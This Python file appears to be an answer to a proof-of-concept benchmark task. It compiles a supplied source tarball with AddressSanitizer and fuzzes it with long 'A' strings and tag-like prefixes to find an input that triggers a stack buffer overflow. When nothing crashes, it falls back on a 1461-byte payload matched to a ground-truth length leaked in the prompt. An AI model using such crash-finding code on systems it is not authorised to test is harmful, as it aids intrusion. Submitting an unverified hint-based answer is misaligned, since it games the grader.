import os
import sys
import subprocess
import tempfile
import tarfile
import re
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        # Ground truth length provided in prompt is 1461. 
        # This is a strong hint for the buffer size or payload structure.
        fallback_poc = b'A' * 1461
        
        with tempfile.TemporaryDirectory() as work_dir:
            # 1. Extract source code
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=work_dir)
            except Exception:
                return fallback_poc

            # 2. Locate the actual source root (handle tarballs with a single top-level folder)
            src_root = work_dir
            contents = os.listdir(work_dir)
            if len(contents) == 1 and os.path.isdir(os.path.join(work_dir, contents[0])):
                src_root = os.path.join(work_dir, contents[0])

            # 3. Build the project
            exe_path = self._build_project(src_root)
            if not exe_path:
                return fallback_poc

            # 4. Extract interesting strings (potential tags) from source
            tokens = self._extract_tokens(src_root)
            
            # 5. Fuzzing Loop
            # We want to trigger a stack buffer overflow.
            # Vulnerability: "when a tag is found and the output size is not checked".
            
            # Strategy 1: Check ground truth length and nearby powers of 2
            lengths = [1461, 1024, 2048, 4096, 512, 1500]
            for l in lengths:
                payload = b'A' * l
                if self._check_crash(exe_path, payload):
                    return payload

            # Strategy 2: Prefix/Wrap payload with discovered tokens (simulating tags)
            # Prioritize short alphanumeric tokens
            priority_tokens = [t.encode('utf-8') for t in tokens if t.isalnum() and len(t) < 15]
            # Add generic tag candidates
            priority_tokens.extend([b'tag', b'TAG', b'id', b'name', b'val', b'type', b'key'])
            
            delimiters = [b'', b'<', b'[', b'{', b'%', b':']
            closers = [b'', b'>', b']', b'}', b' ', b'=']
            
            # We focus on length around 1461-1500 as per ground truth hint
            base_len = 1500 
            
            for token in priority_tokens:
                for d in delimiters:
                    for c in closers:
                        # Construct various header formats
                        # 1. <TAG> + Overflow
                        header = d + token + c
                        payload = header + (b'A' * base_len)
                        if self._check_crash(exe_path, payload):
                            return payload
                        
                        # 2. <TAG Overflow ...
                        # Payload inside the tag?
                        if d and c:
                            payload = d + token + b' ' + (b'A' * base_len) + c
                            if self._check_crash(exe_path, payload):
                                return payload

            # Strategy 3: Just try random combinations of tokens and lengths for a short while
            # (Limited by environment constraints, but useful if specific header needed)
            for _ in range(50):
                t = random.choice(priority_tokens) if priority_tokens else b'tag'
                d = random.choice(delimiters)
                c = random.choice(closers)
                l = random.randint(1400, 2000)
                payload = d + t + c + (b'A' * l)
                if self._check_crash(exe_path, payload):
                    return payload

            return fallback_poc

    def _build_project(self, src_root):
        """Compile the project with ASAN."""
        env = os.environ.copy()
        env['CC'] = 'clang'
        env['CXX'] = 'clang++'
        # Enable AddressSanitizer and debug info
        env['CFLAGS'] = '-fsanitize=address -g -O1'
        env['CXXFLAGS'] = '-fsanitize=address -g -O1'
        
        # Detect build system
        cmds = []
        if os.path.exists(os.path.join(src_root, 'autogen.sh')):
             cmds.append(['./autogen.sh'])
        
        if os.path.exists(os.path.join(src_root, 'configure')):
            cmds.append(['./configure'])
            cmds.append(['make', '-j8'])
        elif os.path.exists(os.path.join(src_root, 'CMakeLists.txt')):
            cmds.append(['cmake', '.'])
            cmds.append(['make', '-j8'])
        else:
            # Fallback to simple make
            cmds.append(['make', '-j8'])
            
        for cmd in cmds:
            try:
                subprocess.run(cmd, cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
            except Exception:
                pass
                
        # Find executable
        candidates = []
        for root, _, files in os.walk(src_root):
            for f in files:
                path = os.path.join(root, f)
                # Check executable permission
                if os.access(path, os.X_OK):
                    # Filter out source files, objects, scripts, libraries
                    if f.endswith(('.c', '.cc', '.cpp', '.h', '.o', '.a', '.so', '.sh', '.py', '.pl', '.m4', '.in')):
                        continue
                    if f in ['configure', 'config.status', 'libtool', 'depcomp', 'missing', 'install-sh']:
                        continue
                    candidates.append(path)
        
        if not candidates:
            return None
        
        # Heuristic: Prefer binary with 'arvo' in name, or shortest name
        arvo_cands = [c for c in candidates if 'arvo' in os.path.basename(c).lower()]
        if arvo_cands:
            return arvo_cands[0]
        
        # Sort by name length (often main binary is short, tests are long)
        candidates.sort(key=lambda x: len(os.path.basename(x)))
        return candidates[0]

    def _extract_tokens(self, src_root):
        """Extract string literals from C/C++ source files to use as potential tags."""
        tokens = set()
        for root, _, files in os.walk(src_root):
            for f in files:
                if f.endswith(('.c', '.cc', '.cpp', '.h')):
                    try:
                        with open(os.path.join(root, f), 'rb') as source_file:
                            content = source_file.read()
                            # Find string literals: "string"
                            matches = re.findall(b'"([a-zA-Z0-9_]{2,15})"', content)
                            for m in matches:
                                tokens.add(m.decode('utf-8', errors='ignore'))
                    except Exception:
                        continue
        return list(tokens)

    def _check_crash(self, exe, payload):
        """Run the executable with payload and check for crash."""
        if not exe:
            return False
            
        # Method 1: Input via Stdin
        try:
            p = subprocess.run(
                [exe], 
                input=payload, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.PIPE, 
                timeout=0.5
            )
            # ASAN prints to stderr. Return code usually non-zero.
            if b'AddressSanitizer' in p.stderr or p.returncode == -11:
                return True
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass
            
        # Method 2: Input via File Argument
        tf_path = None
        try:
            with tempfile.NamedTemporaryFile(delete=False) as tf:
                tf.write(payload)
                tf_path = tf.name
            
            p = subprocess.run(
                [exe, tf_path], 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.PIPE, 
                timeout=0.5
            )
            if b'AddressSanitizer' in p.stderr or p.returncode == -11:
                return True
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass
        finally:
            if tf_path and os.path.exists(tf_path):
                os.unlink(tf_path)
                
        return False
